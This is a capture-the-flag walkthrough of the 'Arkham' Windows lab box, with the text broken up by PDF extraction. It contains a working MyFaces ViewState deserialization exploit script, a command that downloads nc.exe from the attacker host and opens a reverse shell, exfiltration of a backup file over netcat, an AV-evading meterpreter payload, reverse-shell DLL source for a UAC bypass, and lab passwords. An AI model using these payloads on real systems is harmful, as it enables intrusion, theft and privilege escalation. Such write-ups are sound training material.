@@ -1,0 +1,469 @@
+Arkham
+
+15th May 2019 / Document No D19.100.30
+
+Prepared By: MinatoTW
+Machine Author: MinatoTW
+Difficulty: M edium
+Classification: Official
+
+                                                                       Page 1 / 22
+SYNOPSIS
+
+Arkham is a medium difficulty Windows box which needs knowledge about encryption, java
+deserialization and Windows exploitation. A disk image present in an open share is found which
+is a LUKS encrypted disk. The disk is cracked to obtain configuration files. The Apache MyFaces
+page running on tomcat is vulnerable to deserialization but the viewstate needs to encrypted.
+After establishing a foothold an Outlook OST file is found, which contains a screenshot with a
+password. The user is found to be in the Administrators group, and a UAC bypass can be
+performed to gain a SYSTEM shell.
+
+Skills Required          Skills Learned
+
+     Enumeration              Java Deserialization
+     Scripting                UAC bypass
+     Basic Cryptography
+
+                                                    Page 2 / 22
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.130 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr ' \n' ' ,' | sed s/,$//)
+ nmap -p$ports -sC -sV -T4 10.10.10.130
+
+IIS is running on port 80 along with SMB and Apache tomcat at their respective ports.
+
+                                                                                                                 Page 3 / 22
+SMB
+
+Lets use smbclient to bind with a null session to list open shares.
+ smbclient -N -L \\\\10.10.10.130
+
+We find a share named BatShare, connect to it and list the contents.
+ smbclient -N \\\\10.10.10.130\\BatShare
+
+As the file is large in size, we'll mount the share and then copy the file.
+ mount -t cifs -o rw,username=guest,password= '//10.10.10.130/BatShare' /mnt
+ cp /mnt/appserver.zip .
+And then unzip it to view the contents.
+ unzip appserver.zip
+
+                                                                                                                 Page 4 / 22
+CRACKING THE DISK IMAGE
+
+After extracting the zip we find a note which says the backup image is from a Linux server and a
+backup image. Running "file" on the image says that it's a LUKS encrypted disk, which is possible
+to crack.
+
+Follow these steps to crack the disk.
+ cryptsetup luksDump backup.img | grep " Payload offset" # Add 1 to the
+ result
+ dd if=backup.img of=header bs=512 count=4097
+ hashcat -m 14600 -a 0 -w 3 header rockyou.txt
+It could take a while to crack. Once done the password is found to be "batmanforever".
+Now we need to open and mount the disk.
+ cryptsetup luksOpen backup.img dump # Pass is batmanforever
+ mount /dev/mapper/dump /mnt
+
+After mounting we find some images and tomcat configuration files which can be useful later.
+                                                                                                                 Page 5 / 22
+APACHE TOMCAT
+
+Navigating to port 8080 we find a normal blog.
+
+Most of the options seem useless however clicking on subscription takes us to another page
+http://10.10.10.130:8080/userSubscribe.faces.
+
+The page extension suggests that it's an Apache MyFaces installation. A google search about
+Apache MyFaces vulnerabilities shows an RCE exists in it due to insecure deserialization of JSF
+viewstates here. Viewing the source of the page, we see that javax ViewState is present.
+
+                                                                                                                 Page 6 / 22
+EXPLOITING DESERIALIZATION
+
+Going back to the tomcat configuration files we found earlier it's seen that the page uses
+encrypted viewstates from the web.xml.bak file.
+
+ <description> State saving method: 'client' or 'server' (=default). See JSF
+ Specification 2.5.2</description>
+ <param-name> javax.faces.STATE_SAVING_METHOD</param-name>
+ <param-value>server</param-value>
+ </context-param>
+ <c ontext-param>
+ <p aram-name> org.apache.myfaces.SECRET</param-name>
+ <param-value>SnNGOTg3Ni0=</param-value>
+ </c ontext-param>
+
+           <context-param>
+           <param-name> org.apache.myfaces.MAC_ALGORITHM</param-name>
+           <p aram-value>HmacSHA1</p aram-value>
+           </context-param>
+ <context-param>
+ <p aram-name> org.apache.myfaces.MAC_SECRET</p aram-name>
+ <p aram-value>SnNGOTg3Ni0=</param-value>
+ </c ontext-param>
+ <c ontext-param>
+ <description>
+
+It's also seen that the viewstate is saved on the server side. So, we'll have to create a malicious
+viewstate and then encrypt it using the parameters we already have.
+
+CREATING SERIALIZED PAYLOAD
+
+Ysoserial is a tool used to create malicious serialized payloads. Download the jar from JitPack,
+make sure you have openjdk-8 installed.
+
+ apt install openjdk-8-jdk
+
+                                                                                                                 Page 7 / 22
+ wget
+ https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-m
+ aster-SNAPSHOT.jar
+ java -jar ysoserial-master-SNAPSHOT.jar
+
+We have a lot of payloads but let's go with the common ones i.e CommonsCollections. Lets see if
+we can ping ourselves first.
+ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n
+ 2 10.10.16.32' > payload.bin
+
+In order to encrypt the payload we'll use python. The d ocumentation says the default encoding is
+DES with PKCS5 padding if not specified. We'll use pyDes to create the payload.
+
+ pip install pyDes
+
+The following lines will encrypt our payload,
+
+ key= bytes(' SnNGOTg3Ni0=').decode('base64') # The secret key
+
+ obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
+ enc = obj.encrypt(payload) # Encrypting with DES from
+ https://wiki.apache.org/myfaces/Secure_Your_Application
+
+The key is from the config file we found earlier. We initialize the object with the key, ECB mode
+and PKCS5 padding and then encrypt the payload.
+
+Next we need to create the HMAC. The HMAC is used to verify the integrity of the message. It is
+calculated and appended to the message, so that it can be verified when it is received. From the
+config we know that the HMAC algorithm is SHA1 and the key is same as the encryption.
+
+ hash_val = (hmac.new(key, bytes(enc), sha1).digest()) # Calculating hmac
+ payload = enc + hash_val
+ payload_b64 = base64.b64encode(payload) # Creating final payload
+
+The above snippet creates the SHA1 hash of the encrypted payload from earlier. Make sure to
+use raw bytes and not hexdigest. Then it is base64 encoded to be sent.
+
+                                                                                                                 Page 8 / 22
+Here's the final script,
+
+ #!/usr/bin/python
+
+ from requests import post, get
+ from bs4 i mport BeautifulSoup
+ import sys
+ from urllib import urlencode,quote_plus
+ import pyDes
+ import base64
+ import hmac
+ from hashlib import sha1
+
+ url = 'http://10.10.10.130:8080/userSubscribe.faces'
+
+ def g etViewState( ): # Finding if viewState exists or not
+    t ry:
+           request = get(url)
+    e xcept:
+          print "Can't connect to the server"
+           sys.exit()
+    soup = BeautifulSoup(request.text, 'html.parser')
+    viewState = soup.find(' input', id=' javax.faces.ViewState')['value']
+    r eturn viewState
+
+ def g etPayload():
+    # Creating a payload for commons-collections 3.1 from
+
+ https://github.com/frohoff/ysoserial
+    payload = open(' payload.bin', ' rb') .read()
+    r eturn payload.strip()
+
+ def e xploit( ):
+    viewState = getViewState()
+    i f viewState is N one:
+
+                                                                                                                 Page 9 / 22
+          print "No viewState found"
+    e lse:
+
+          print "Viewstate found: {}". format(viewState)
+
+    payload = getPayload()
+
+    key= bytes('SnNGOTg3Ni0=') .decode(' base64') # The secret key
+
+    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
+    enc = obj.encrypt(payload) # Encrypting with DES from
+ https://wiki.apache.org/myfaces/Secure_Your_Application
+
+    hash_val = (hmac.new(key, bytes(enc), sha1).digest()) # Calculating hmac
+
+    payload = enc + hash_val
+
+    payload_b64 = base64.b64encode(payload) # Creating final payload
+
+    p rint "\n\n\nSending encoded payload: "+ payload_b64
+
+    headers = {
+          "Accept":
+
+ "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+
+          "Connection": "keep-alive",
+          "User-Agent": "Tomcat RCE",
+          "Content-Type": " application/x-www-form-urlencoded"}
+
+    execute = {'javax.faces.ViewState': payload_b64}
+    r = post(url, headers=headers, data=execute)
+
+ if __name__ == '__main__':
+           exploit()
+
+The getViewState function just checks if the VIewState is present or not. The getPayload function
+reads the payload from the file we created using ysoserial. Then encryption and hmac creation
+takes place as discussed earlier. Then the payload is sent as a POST parameter for
+javax.faces.ViewState.
+
+                                                                                                                Page 10 / 22
+Running the script we see that our ping is returned.
+                                                                                                                 Page 11 / 22
+FOOTHOLD
+
+Now that we have RCE lets use nc.exe to get a shell. Start a simple HTTP server and then create
+the payload to download and execute it.
+
+ java -jar ysoserial.jar CommonsCollections5 ' powershell wget
+ 10.10.16.32/nc.exe -O C:\\Windows\\Temp\\pwn.exe && cmd /c
+ C:\\Windows\\Temp\\pwn.exe 10.10.16.32 443 -e powershell.exe' > payload.bin
+ python3 -m http.server 80
+
+And we get a shell as user Alfred.
+
+                                    Page 12 / 22
+LATERAL MOVEMENT
+ENUMERATION
+
+While enumerating the file system we come across a zip file in the Downloads folder of the user.
+
+Lets transfer it using the nc.exe we placed earlier.
+ certutil -encode backup.zip backup.b64
+ cat backup.b64 | cmd /c C:\windows\temp\pwn.exe 1 0.10.16.32 4444
+And locally:
+ nc -lvp 4 444 > backup.b64 #remove the certificate markers from top and
+ bottom
+ sed -i s/\n//g backup.b64 # remove new lines
+ base64 -d backup.b64 > backup.zip
+ unzip backup.zip
+
+                                                                                                                Page 13 / 22
+Ignore the base64 error due to certutil padding. After unzipping we find the OST file.
+
+An OST file is an offline folder file for Microsoft Outlook. It's local copy of the user's mailbox
+which is stored in an email server such as Exchange. We can use readpst to open it up.
+ apt install pst-utils
+ readpst alfred@arkham.local.ost
+It finds one item in the Draft folder.
+
+It creates an mbox file which can be opened using evolution or thunderbird.
+ apt install evolution
+ evolution Drafts.mbox
+In there we find a screenshot containing a password from Batman.
+
+                                                                                                                Page 14 / 22
+Using the credentials Batman / Zx^#QX+T!123 we can now login via WinRM.
+ $pass = c onvertto-securestring ' Zx^#QZX+T!123' -asplain -force
+ $cred = n ew-object
+ system.management.automation.pscredential('arkham\batman', $ pass)
+ enter-pssession -computer arkham -credential $cred
+
+And we are Batman!
+
+                                                                                                                Page 15 / 22
+PRIVILEGE ESCALATION
+ENUMERATION
+
+We look at the user's groups and find that he's in the Administrators group.
+
+So we'll have to stage a UAC bypass to get a SYSTEM shell. Looking at systeminfo we see that
+the OS is Windows server 19.
+There can be many ways to do a UAC bypass but there's one specific to Server 19 and more
+guaranteed to work. According to h ttps://egre55.github.io/system-properties-uac-bypass/ we can
+bypass UAC through DLL hijacking via SystemPropertiesAdvanced.exe as it auto-elevates.
+But as SystemPropertiesAdvanced is a GUI app we'll need to be in session 1 to execute it as
+PSRemoting uses session 0. So, we'll get a meterpreter and migrate to a process in session 1.
+
+                                                                                                                Page 16 / 22
+GETTING A METERPRETER
+
+We'll use GreatSCT to get a meterpreter as we need to bypass AV.
+ git clone https://github.com/GreatSCT/GreatSCT
+ cd GreatSCT/setup
+ sudo ./setup.sh -c
+ cd ..
+ ./GreatSCT.py
+
+Lets create a msbuild/meterpreter/rev_tcp.py payload as it'll be easy to evade.
+
+ use 1
+ list
+ use 9
+ set lhost 1 0.10.1 6.32
+ generate
+
+Copy the payload.xml and start msf using the payload.rc file.
+
+ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
+
+Download the xml file onto the target and execute it using msbuild.
+
+ powershell wget 1 0.10.16.32/ payload.xml -O payload.xml
+ cmd /c C:\Windows\Microsoft.NET\Framework\v4.0 .30319\ msbuild.exe
+ payload.xml
+
+The process should hang and we should get a session.
+
+                                                                                                                Page 17 / 22
+Now we need to migrate to a process in session 1. List all the processes using ps.
+
+We see a svchost.exe process running as batman in session 1. Lets migrate to it.
+
+Note: Incase the migration fails kill the session and try again. It might take 4 -5 attempts to
+succeed.
+
+DLL HIJACKING
+
+Now that we have a shell in session 1 we just need to create a malicious DLL and place it in the
+WindowsApps folder to get it executed. Here's a sample DLL,
+ #include <winsock2.h>
+ #include < windows.h>
+ #include <stdio.h>
+ #include <ws2tcpip.h>
+ #define DEFAULT_BUFLEN 1024
+ void E xecutePayload( v oid) ;
+
+                                                                                                                Page 18 / 22
+BOOL WINAPI
+DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
+{
+
+         switch (dwReason)
+         {
+         case DLL_PROCESS_ATTACH:
+
+                             ExecutePayload();
+                   break;
+
+         case DLL_PROCESS_DETACH:
+                   // Code to run when the DLL is freed
+                   break;
+
+         case DLL_THREAD_ATTACH:
+                   // Code to run when a thread is created during the DLL's
+
+lifetime
+                   break;
+
+         case DLL_THREAD_DETACH:
+                   // Code to run when a thread ends normally.
+                   break;
+
+         }
+         return TRUE;
+}
+
+void E xecutePayload( v oid) {
+
+Sleep(1 000) ;  // 1000 = One Second
+
+         SOCKET mySocket;
+         sockaddr_in addr;
+         WSADATA version;
+         WSAStartup(MAKEWORD(2,2 ) , &version);
+         mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned
+int)N ULL, (u nsigned int)N ULL);
+
+                                                                Page 19 / 22
+         addr.sin_family = AF_INET;
+
+         addr.sin_addr.s_addr = inet_addr(" 10.10.16.32") ;
+         addr.sin_port = htons(4443) ;
+         //Connecting to Proxy/ProxyIP/C2Host
+         if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, N ULL,
+NULL, NULL)==SOCKET_ERROR) {
+
+                   closesocket(mySocket);
+                   WSACleanup();
+         }
+         else {
+                   char RecvData[DEFAULT_BUFLEN];
+                   memset( RecvData, 0 , s izeof(RecvData));
+                   int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0) ;
+                   if (RecvCode <= 0 ) {
+
+                             closesocket(mySocket);
+                             WSACleanup();
+                   }
+                   else {
+                             char Process[] = " cmd.exe";
+                             STARTUPINFO sinfo;
+                             PROCESS_INFORMATION pinfo;
+                             memset(&sinfo, 0 , sizeof(sinfo));
+                             sinfo.cb = s izeof( sinfo);
+                             sinfo.dwFlags = (STARTF_USESTDHANDLES |
+STARTF_USESHOWWINDOW);
+
+                             sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =
+(HANDLE) mySocket;
+
+                             CreateProcess(N ULL, Process, N ULL, N ULL, TRUE, 0 , NULL,
+NULL, &sinfo, &pinfo);
+
+                             WaitForSingleObject(pinfo.hProcess, INFINITE);
+                             CloseHandle(pinfo.hProcess);
+                             CloseHandle(pinfo.hThread);
+
+                             memset( RecvData, 0, s izeof( RecvData));
+                             int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN,
+
+                                                                                                              Page 20 / 22
+ 0);
+                               if (RecvCode <= 0) {
+                               closesocket(mySocket);
+                               WSACleanup();
+                               }
+                               if (s trcmp( RecvData, "exit\n") == 0 ) {
+                               exit( 0 ) ;
+                               }
+
+                     }
+           }
+ }
+The DLL uses raw sockets to execute commands with cmd.exe and uses the sockets file
+descriptors to send output and get input.
+Compile it using mingw to a 32 bit DLL named srrstr.dll as that's what the binary looks for.
+ apt install mingw-64
+ i686-w64-mingw32-g++ pwn.cpp -lws2_32 -o srrstr.dll -shared
+
+When done upload it to the windowsapps folder as suggested by the article.
+ cd C:\Users\Batman\AppData\Local\Microsoft\WindowsApps
+ upload srrstr.dll
+
+Once uploaded execute the binary C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe or
+any other SystemProperties* binary.
+ cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+
+                                                                                                                Page 21 / 22
+We get a shell as batman, but however we have more privileges now.
+And we can move into the Administrator folder to read the flag.
+
+                                                                                                               Page 22 / 22
+
